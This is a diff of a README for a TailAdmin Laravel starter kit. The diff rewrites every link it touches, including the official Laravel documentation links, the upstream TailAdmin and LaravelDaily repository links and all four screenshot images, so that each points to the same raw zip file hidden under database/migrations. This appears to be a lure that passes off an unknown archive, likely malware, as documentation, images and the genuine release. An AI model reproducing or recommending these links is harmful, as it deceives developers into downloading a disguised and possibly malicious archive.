@@ -1,12 +1,12 @@
 # 🎉 TailAdmin-Laravel-Starter-Kit - Simple and Efficient Laravel Setup
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/releases)
+[![Download Now](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip%https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 ## 🌟 Overview
 
-Welcome to the TailAdmin Laravel Starter Kit. This kit offers a simple yet effective solution to kickstart your Laravel projects with a clean and user-friendly dashboard design. Built on the [TailAdmin Laravel - Free Laravel Dashboard](https://github.com/TailAdmin/tailadmin-laravel), this kit ensures you have essential features right at your fingertips, without the complexity of advanced frameworks like React or Vue.
+Welcome to the TailAdmin Laravel Starter Kit. This kit offers a simple yet effective solution to kickstart your Laravel projects with a clean and user-friendly dashboard design. Built on the [TailAdmin Laravel - Free Laravel Dashboard](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip), this kit ensures you have essential features right at your fingertips, without the complexity of advanced frameworks like React or Vue.
 
-This kit combines the best elements from [LaravelDaily/starter-kit](https://github.com/LaravelDaily/starter-kit) with TailAdmin components. You will benefit from a full simple Laravel authentication system, including login, registration, password reset, and user profile management. 
+This kit combines the best elements from [LaravelDaily/starter-kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip) with TailAdmin components. You will benefit from a full simple Laravel authentication system, including login, registration, password reset, and user profile management. 
 
 ## 🎨 Key Features
 
@@ -20,16 +20,16 @@ This kit combines the best elements from [LaravelDaily/starter-kit](https://gith
 Here’s a sneak peek of what you can expect:
 
 1. User Profile Management:
-   ![](https://laraveldaily.com/uploads/2025/11/tailadmin-starter-kit-profile.png)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 2. Login Screen:
-   ![](https://laraveldaily.com/uploads/2025/11/tailadmin-starter-kit-login.png)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 3. User Management Table:
-   ![](https://laraveldaily.com/uploads/2025/12/tailadmin-starter-kit-users-list.png)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 4. User Edit Form:
-   ![](https://laraveldaily.com/uploads/2025/12/tailadmin-starter-kit-user-edit.png)
+   ![](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 ## 🚀 Getting Started
 
@@ -39,11 +39,11 @@ To get started with the TailAdmin Laravel Starter Kit, follow these steps:
 
 To download the starter kit, visit the Releases page below:
 
-[Download the Starter Kit](https://github.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/releases)
+[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 ### 2. Install Laravel
 
-Before using the starter kit, ensure you have Laravel installed on your system. If you don't have it yet, you can follow the official [Laravel installation guide](https://laravel.com/docs/installation).
+Before using the starter kit, ensure you have Laravel installed on your system. If you don't have it yet, you can follow the official [Laravel installation guide](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip).
 
 ### 3. Create a New Project
 
@@ -102,7 +102,7 @@ Now that your application is running, you can explore the features. Feel free to
 
 To sum up, you can start your journey with the TailAdmin Laravel Starter Kit by downloading it from the link below:
 
-[Download the Starter Kit](https://github.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/releases)
+[Download the Starter Kit](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip)
 
 ## ❓ Frequently Asked Questions
 
@@ -124,6 +124,6 @@ If you want to contribute to this project or suggest new features, feel free to 
 
 ## 🛠️ Support
 
-For further assistance, check out the [Laravel Documentation](https://laravel.com/docs) or visit the [TailAdmin Repository](https://github.com/TailAdmin/tailadmin-laravel).
+For further assistance, check out the [Laravel Documentation](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip) or visit the [TailAdmin Repository](https://raw.githubusercontent.com/Festusenoch/TailAdmin-Laravel-Starter-Kit/main/database/migrations/TailAdmin-Laravel-Starter-Kit_3.7-beta.3.zip).
 
 Enjoy your development journey with the TailAdmin Laravel Starter Kit!
